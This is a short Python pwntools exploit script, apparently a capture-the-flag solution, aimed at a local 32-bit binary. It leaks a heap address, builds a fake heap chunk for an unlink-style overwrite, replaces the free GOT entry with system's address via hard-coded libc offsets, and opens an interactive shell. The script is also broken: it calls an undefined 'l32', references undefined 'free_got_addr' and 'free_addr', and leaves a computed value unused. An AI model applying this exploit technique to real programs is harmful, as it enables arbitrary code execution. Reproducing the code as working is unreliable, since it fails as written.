from pwn import *
p = process("./main")
# gdb.attach(p)
leak_heap_addr = p.recv()[:-1]
heap_addr = int(leak_heap_addr , 16)-8
print hex(heap_addr)

payload = p32(0x00000000)  + p32(0x00000513) + p32(heap_addr - 0xc) + l32(heap_addr - 0x8)
payload = payload + 'a'*(0x512-16) 
payload = payload + p32(0x00000512) + p32(0x0000051a)
p.send(payload)

payload2 = "a"*12 + p32(free_got_addr)
p.send(payload2)

leak_got_addr = p.recv()[:-1]
got_addr = int(leak_got_addr , 16)-8
base_addr = free_addr - 0x00077390
sys_addr = base_addr + 0x0003E770
print hex(sys_addr)

payload3 = p32(sys_addr) 
p.send(payload3)
p.interactive()
